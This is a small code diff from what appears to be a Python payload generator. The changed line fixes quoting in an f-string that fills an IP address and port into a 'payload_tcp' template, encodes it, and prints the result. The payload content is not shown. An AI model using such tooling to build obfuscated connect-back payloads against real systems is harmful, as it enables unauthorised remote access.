@@ -21,4 +21,4 @@ def encrypt_string(text):
 
     return base64_encoded
 
-print(f"{colorama.Fore.LIGHTBLUE_EX}{code.replace("<payload_tcp>", encrypt_string(payload_tcp.replace("<ip>", ip_address).replace("<port>", port)))}")
+print(f"{colorama.Fore.LIGHTBLUE_EX}{code.replace('<payload_tcp>', encrypt_string(payload_tcp.replace('<ip>', ip_address).replace('<port>', port)))}")
